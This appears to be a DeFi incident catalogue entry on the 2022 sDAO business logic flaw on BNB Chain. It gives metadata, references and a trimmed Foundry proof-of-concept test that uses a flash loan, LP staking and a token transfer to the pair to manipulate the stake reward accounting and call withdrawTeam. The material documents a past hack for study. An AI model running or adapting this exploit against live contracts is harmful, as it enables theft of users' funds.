# [?] - sDAO - Business Logic Flaw

## Summary
Severity: Unknown
Chain: BNB Chain
Component: SDAO
Published: 2022-11-21
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-11/SDAO_exp.sol
Type: defi-exploit-poc

## Details
Lost: $13k
References:
- https://twitter.com/8olidity/status/1594693686398316544
- https://twitter.com/CertiKAlert/status/1594615286556393478
- https://bscscan.com/tx/0xb3ac111d294ea9dedfd99349304a9606df0b572d05da8cedf47ba169d10791ed

```solidity
contract ContractTest is Test {
    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    sDAO SDAO = sDAO(0x6666625Ab26131B490E7015333F97306F05Bf816);
    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    Uni_Pair_V2 Pair = Uni_Pair_V2(0x333896437125fF680f146f18c8A164Be831C4C71);
    address dodo = 0x26d0c625e5F5D6de034495fbDe1F6e9377185618;

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("bsc", 23_241_440);
    }

    function testExploit() public {
        USDT.approve(address(Router), type(uint256).max);
        SDAO.approve(address(Router), type(uint256).max);
        Pair.approve(address(Router), type(uint256).max);
        Pair.approve(address(SDAO), type(uint256).max);
        SDAO.approve(address(this), type(uint256).max);
        DVM(dodo).flashLoan(0, 500 * 1e18, address(this), new bytes(1));

        emit log_named_decimal_uint("[End] Attacker USDT balance after exploit", USDT.balanceOf(address(this)), 18);
    }

    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
        USDTToSDAO();
        addUSDTsDAOLiquidity();
        SDAO.stakeLP(Pair.balanceOf(address(this)) / 2);
        // SDAO.transfer(address(Pair), SDAO.balanceOf(address(this)));
        SDAO.transferFrom(address(this), address(Pair), SDAO.balanceOf(address(this))); // change totalStakeReward > lastTotalStakeReward
        SDAO.withdrawTeam(address(Pair));
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-11/SDAO_exp.sol_
